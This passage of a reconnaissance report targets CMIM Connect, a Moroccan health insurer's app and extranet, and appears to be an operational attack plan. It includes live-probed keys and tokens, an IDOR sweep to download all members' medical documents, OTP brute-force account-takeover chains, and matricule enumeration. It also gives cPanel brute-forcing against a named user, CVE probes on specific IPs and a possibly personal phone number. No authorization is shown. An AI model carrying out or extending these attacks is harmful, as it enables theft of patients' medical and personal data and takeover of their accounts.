| `GET /api/Get_PEC_Listing_mobile` | `uid` | Prior authorization (PeC) list |
| `GET /api/Get_PEC_Accords_Listing_mobile?_format=json` | `uid` | PeC accord list |
| `GET /api/Get_PEC_details` | `id`, `uid` | PeC detail |
| `GET /api/Get_Reimbursements_Listing_mobile` | `uid` | Reimbursement claims list |
| `GET /api/Get_Reimbursements_Accords_Listing_mobile?_format=json` | `uid` | Reimbursement accords |
| `GET /api/Get_Last_Reimbursements_Listing_mobile` | `uid` | Recent reimbursements |
| `GET /api/Get_Reimbursements_details` | `id`, `uid` | Reimbursement detail + amounts |
| `GET /api/Get_Courriers_Listing_mobile` | `uid` | Correspondence list |
| `GET /api/Get_Reclamations_mobile` | `uid` | Complaints list |
| `GET /api/Get_Reclamations_details` | `id`, `uid` | Complaint detail |
| `GET /api/Get_Config_dossiers_scannes` | none | Scanned document config |

**XML dossier submission format** (found in `libapp.so` strings):
```xml
<?xml version="1.0"?><dossier><matricule>XXXX</matricule><ref>YYYY</ref><id-demande>ZZZ</id-demande><beneficiaire>NNN</beneficiaire><filename>file.pdf</filename><montant>NNN</montant></dossier>
```

---

#### Group 5: File Download — Primary IDOR Target

**`GET /api/Download_files?id_File=<int>`**
- Params: `id_File` (integer, sequential)
- Response 200: file binary (PDF, image) — confirmed via Content-Type
- Response on invalid ID: HTML error or empty
- Risk: **CRITICAL IDOR** — iterate `id_File=1..9999` to download all uploaded medical documents from all members
- `api_probe.py --all` runs automated sweep from 1 to 200

---

#### Group 6: Actions (Auth Required)

**`POST /api/Depot_dossier`**
- Body: multipart/form-data
- Params: `uid`, `type` (rmb/ald/pec/dental/etc.), file attachment
- Risk: File upload — check for unrestricted extension/MIME bypass

**`POST /api/CreateReclamation`**
- Body (JSON): `{"uid": "<int>", "sujet": "<subject>", "message": "<body>"}`
- Risk: Stored XSS if admin views complaints in Drupal backend without sanitization

**`POST /api/DemandeReclamation`**
- Body (JSON): `{"uid": "<int>", ...}`

---

#### Group 7: Password Reset Flow (3-step)

| Step | Endpoint | Method | Body | Purpose |
|---|---|---|---|---|
| 1 | `/api/Get_user_password` | GET | `matricule=<mat>` | Trigger SMS OTP to member's phone |
| 2 | `/api/User_Password_CheckSMS` | POST | `{"matricule":"<mat>","code":"<6digit>"}` | Verify OTP |
| 3 | (Drupal user update) | POST | `PswThirdStep.dart` — sets new password | Set new password |

**Risk:** Step 2 has no observed rate limiting → brute-force 6-digit OTP (1,000,000 combinations) → full account takeover without knowing current password.

### Unauthenticated Endpoint Results (Live Probed)
| Endpoint | HTTP | Response |
|---|---|---|
| `GET /api/Get_Config_Key` | 200 | `{"key":"2Tr5TjgjHUabXTxV8LNgxMn88","code":"200"}` |
| `GET /session/token` | 200 | `_guXmKTq9cenZbB7jv43OdH21dcP1y9Z_LwmcuqXSgE` |
| `GET /api/Guide_user` | 200 | PDF guide links + YouTube video IDs (no auth) |
| `GET /api/Get_user_matricule` | 200 | `{"message":"Participant n'existe pas","code":"404"}` — oracle |
| `GET /api/Activate_user` | 200 | `{"message":"Nous n'avons pas pu vous identifier...","code":"-1"}` |
| `GET /api/Get_user_password` | 200 | Empty body (GET) / HTML error (POST) |
| `POST /api/User_login?_format=json` | 405→200 | `{"code":"400","message":"Username and password are required."}` |

### Support Contacts (leaked in binary)
| Value | Type |
|---|---|
| `support.extranet@cmim.ma` | Tech support email |
| `cmimconnect@cmim.ma` | App service account |
| `05 22 42 46 55` / `0522424655` | CMIM main switchboard |
| `08 0200 8889` | Toll-free support |
| `06 62 38 74 09` | **Mobile number — possibly personal** |

### Public Files (from `/api/Guide_user`)
```
https://extranet.cmim.ma/upload/public/2025-05/creation_de_compte_CMIM-Connect_0.pdf
https://extranet.cmim.ma/upload/public/2025-05/NOTE D'NFORMATION PS-APPLI MOBILE.pdf
https://extranet.cmim.ma/upload/public/2025-05/BROCHURE pdf_APP CMIM.pdf
https://extranet.cmim.ma/upload/public/2025-05/NOTE D'INFORMATION.pdf
```
YouTube tutorial: `1SCFJ7NHLhU`

### API Probe Script
See `api_probe.py` — tests all HTTP methods on all endpoints with parameter fuzzing.

---

## 13. Blutter — Dart AOT Decompilation Findings

Blutter (https://github.com/worawit/blutter) was run against `libapp.so` + `libflutter.so` (arm64-v8a). Output: `recon/blutter_out/`.

### Setup
- `libapp.so` (11904 KB) — from `base.apk`
- `libflutter.so` (10308 KB) — from `split_config.arm64_v8a.apk` (required separately)
- `libtoolChecker.so` (5 KB) — **anti-tampering / anti-root detection library** (present in `lib/arm64-v8a/`)

---

### Token Authentication System — Fully Reversed

#### `cmimconnect2023` — Hardcoded MD5 Salt

Source: `blutter_out/asm/cmim/Data/Generator.dart` block 2 (addr `0x6f8e44`)

```
"cmimconnect2023"  →  UTF-8  →  MD5  →  "605df5369279704f710cc198803ea775"
```

This MD5 is the **static salt** used in every token. It never changes.

#### Full Token Construction Algorithm

```
generatedKey  = random(15 chars from [a-z0-9], dart:math Random())
               stored in FlutterSecureStorage key "generatedKey"

timestamp     = DateFormat("y-M-d--H").format(DateTime.now())
               e.g. "2026-5-12--17"  (changes every hour)

myMd5Hash     = MD5(
                  MD5(userInput)                       // user's password or session value
                + "605df5369279704f710cc198803ea775"   // MD5("cmimconnect2023") — hardcoded
                + generatedKey                         // 15-char random key
                + timestamp                            // current hour string
               )
```

Source: `Generator.dart` block 2 — string constants appear in order: `cmimconnect2023`, `y-M-d--H`; static fields `0xccc` (myMd5Hash) and `0xcc8` (myRandomString/generatedKey) and `0xcc4` (timestamp).

#### Authenticated API Request Body Format

Every authenticated API call sends:

```json
{
  "Cookie":    "<session_key>",
  "token":     "<myMd5Hash>",
  "date":      "<y-M-d--H timestamp, e.g. 2026-5-12--17>",
  "requestId": "<myRandomString (15-char)>"
}
```

Source: `blutter_out/asm/cmim/Pages/Home/Home.dart` block 3 — static field loads:
- `r0 = LoadStaticField(0xccc)` → assigned to `"token"`
- `r0 = LoadStaticField(0xcc8)` → assigned to `"requestId"`
- `InitLateStaticField(0xcc4)` → assigned to `"date"`

---

### Attack Implication of Weak `dart:math Random()`

`generatedKey` is generated using `dart:math Random()` — **NOT** `Random.secure()`.

`dart:math Random()` is a linear congruential generator (LCG) seeded with system time. It is **not cryptographically secure**. Implications:

| Scenario | Impact |
|---|---|
| Capture `generatedKey` via MITM (Burp — no cert pinning) | Can reconstruct `myMd5Hash` for any timestamp, any user |
| Brute-force `generatedKey` offline | 36^15 keyspace is large but LCG seed is predictable if device time is known |
| Token is hour-granular | `timestamp` changes each hour — replay window is up to 60 minutes |

**Practical attack**: No cert pinning + Burp MITM → intercept one request → extract `generatedKey` + `session_key` → forge tokens for any endpoint for up to 1 hour.

---

### FlutterSecureStorage — At-Rest Encryption

Source: `blutter_out/objs.txt` — classes: `AES_CBC_PKCS7Padding`, `FlutterEncryptedStorage`, `aesx128Bit`, `aesx256Bit`, `aesx256BitRevision6`

All sensitive values stored with **AES-CBC-PKCS7** encryption via `FlutterEncryptedStorage`.

Keys stored in FlutterSecureStorage:
| Key | Content |
|---|---|
| `generatedKey` | 15-char random string — token component |
| `session_key` | Drupal session cookie value |
| `loginMtr` | Last used matricule (for "remember me") |
| `loginPsw` | Last used password (for "remember me") |
| `username` | Drupal username |
| `csrfToken` | CSRF token |
| `uid` | Drupal numeric user ID |
| `matricule` | Member matricule |

**Risk:** On rooted device or with Android backup enabled, these values are accessible. The `loginPsw` key stores the plaintext password — credential exfiltration on rooted device.

---

### New Endpoint Discovered: `Get_Sujet_mobile`

Found in `blutter_out/asm/cmim/Pages/Demandes/NvDmd/` files:

```
GET /api/Get_Sujet_mobile?_format=json
```

- **Purpose:** Fetches claim subjects/types for the "Nouvelle Demande" (new claim) form
- **Auth:** Required (used in authenticated flow)
- **Not previously documented** in the API field map

---

### Rate Limiting Correction — ActivationController

Source: `blutter_out/asm/cmim/Controllers/ActivationController.dart`

**CORRECTION to Finding #3 and #18** — rate limiting IS present:

| Code | Meaning |
|---|---|
| `CODE 406 WAIT 2 MINUTES` | ResendSmsCode cooldown — 2 minutes between OTP requests |
| `CODE 406 ACCOUNT BLOCKED` | Account blocked after excessive failed attempts |

OTP brute-force is still feasible but limited to ~500 codes/attempt before potential block. Attacker must wait 2 minutes between OTP triggers (not between individual code guesses — the limit is on *sending* the OTP, not *checking* it).

---

### Registration Response Codes (RegisterController)

Source: `blutter_out/asm/cmim/Controllers/RegisterController.dart`

| Code | Meaning |
|---|---|
| `CODE 1` | Account created successfully |
| `CODE 2` | User already exists |
| `CODE 04` | Invalid field value |

Password policy (server-side validated):
- Must contain `[A-Z]` (uppercase)
- Must contain `[a-z]` (lowercase)
- Must contain `[0-9]` (digit)
- Must contain `[!@#$%^&*(),.?'"]` (special char)

Phone validation: `^[0-9]{10}$` (10 digits, Moroccan mobile format)

---

### Login Flow (LoginController)

Source: `blutter_out/asm/cmim/Controllers/LoginController.dart`

POST body — only two fields: `username` + `password` (no token required for the login request itself)

Post-login, stores to FlutterSecureStorage: `session_key`, `uid`, `mat`, `phone_number`

---

## 14. Potential Next Steps (Active Phase)

### CRITICAL — Account Takeover Chain (No Valid Creds Required)

**Chain A: Web OTP Brute-Force Account Takeover**
1. Enumerate valid matricule via `GET /api/Get_user_matricule?matricule=XXXXXX` oracle (HTTP 200 + JSON code 404 = miss)
2. POST `{"matricule":"<valid_mat>"}` to `/api/ResendSmsCode` → triggers SMS OTP to member's phone
3. Brute-force `POST /userActiveAccount` with `user_Code=000000..999999` + `user_matricule=<mat>` (6 digits, no rate limit observed)
4. On success: attacker controls member's account

**Chain B: Password Reset OTP Brute-Force**
1. Find valid matricule (same oracle)
2. `GET /api/Get_user_password?matricule=<mat>` → triggers SMS to member
3. Brute-force `POST /api/User_Password_CheckSMS` with `{"matricule":"<mat>","code":"XXXXXX"}` (6 digits)
4. On success: set new password via PswThirdStep flow

**Chain C: IDOR Medical Records (Auth Required)**
1. Obtain any valid session (via Chain A/B or MITM)
2. `GET /api/Download_files?id_File=1` incrementing → downloads all members' medical documents
3. `GET /api/Get_user_infos?uid=N` incrementing → all member PII

**Chain D: Play Store Demo Account**
- Demo account `SÂAD ELNIIMA` visible in Play Store screenshots
- Dossier prefix `MLTEST` — attempt as matricule via oracle
- If demo account uses weak/default password, direct login possible

---

### Immediate / Critical
- **[CRIT]** Use browser with DevTools to hit `POST /CheckUserMatricule` — requires JS execution for real oracle discrimination (valid vs invalid matricule)
- **[CRIT]** Burp Suite MITM: install Burp CA on test device (no cert pinning), intercept live app traffic → capture `session_key` + `generatedKey` + `myMd5Hash` from request body → forge tokens for any endpoint up to 60 min
- **[CRIT]** On rooted device: extract FlutterSecureStorage → get `loginPsw` (plaintext password), `session_key`, `generatedKey`, `uid`, `matricule` directly
- **[CRIT]** IDOR sweep: `python3 api_probe.py --all --cookie "SESS...=..."` → iterate `id_File=1..9999` on `/api/Download_files`
- **[CRIT]** OTP brute-force: `POST /userActiveAccount` with known matricule + 000000..999999 (no rate limit observed)

### High Priority
- **[HIGH]** Drupal SA-CORE-2025-001 (access bypass) + CVE-2024-45440 (path traversal) — no WAF on extranet.cmim.ma
- **[HIGH]** Use `matricule_enum.py` to enumerate valid matricules (range 1..100000, 8 threads)
- **[HIGH]** `/user/register` — CAPTCHA protected but test if server-side validation can be bypassed (direct POST to registration handler)
- **[HIGH]** After obtaining session: `GET /api/Get_user_infos?uid=1..N` IDOR for all member PII
- **[HIGH]** Firebase project `754795614042` — check Firestore/RTDB security rules via Firebase REST API

### Medium Priority
- **[MED]** Test Exim 4.99.x against CVE-2023-42115; VRFY enumeration via `[initial].[lastname]@cmim.ma` format
- **[MED]** M-Files MFWA 8.13 CVEs; Windows domain NTLM auth via `ged.cmim.ma/#winauth` endpoint
- **[MED]** Zabbix agent probe on 79.137.106.243:10050 for `system.run[command]`
- **[MED]** DNS AXFR against BIND 9.11.36 on 159.8.122.139:53
- **[MED]** cPanel brute-force on :2083 with `h.margouni` / common passwords

### Low Priority
- **[LOW]** `cmim_module` PHP error line 38 — undefined array key → SQLi probe
- **[LOW]** M-Files REST API `/REST/objects`, `/REST/session` auth bypass
- **[LOW]** ASP.NET ViewState/machineKey on ged.cmim.ma

---

### Tools Available
| Script | Purpose | Run |
|---|---|---|
| `api_probe.py` | Full HTTP method fuzzing on all 33 API endpoints | `python3 api_probe.py [--cookie SESS=...] [--all]` |
| `matricule_enum.py` | Enumerate valid matricules via API oracle | `python3 matricule_enum.py --start 1 --end 100000 --threads 8` |
| `apk_analyze.sh` | Reanalyze APK / extract new strings | `bash apk_analyze.sh` (on Kali) |
